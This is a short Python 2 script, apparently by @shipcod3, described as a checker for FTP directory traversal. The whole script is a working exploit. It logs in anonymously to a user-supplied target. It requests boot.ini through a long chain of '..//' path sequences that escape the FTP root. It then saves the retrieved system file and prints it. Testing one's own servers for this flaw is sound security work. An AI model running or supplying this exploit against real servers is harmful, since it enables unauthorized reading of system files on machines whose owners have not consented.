# dir_traversal.py allows you to check FTP directory traversal vulnerability
# author : @shipcod3

from ftplib import FTP
 
ftp = FTP(raw_input("Target IP: ")) 
ftp.login()                   
ftp.retrbinary('RETR ..//..//..//..//../..//..//..//..//..//..//..//..//..//..//..//..//boot.ini', open('boot.ini.txt', 'wb').write)
ftp.close()
file = open('boot.ini.txt', 'r')
print "[**] Printing what's inside boot.ini\n"
print "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
print file.read()
print "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
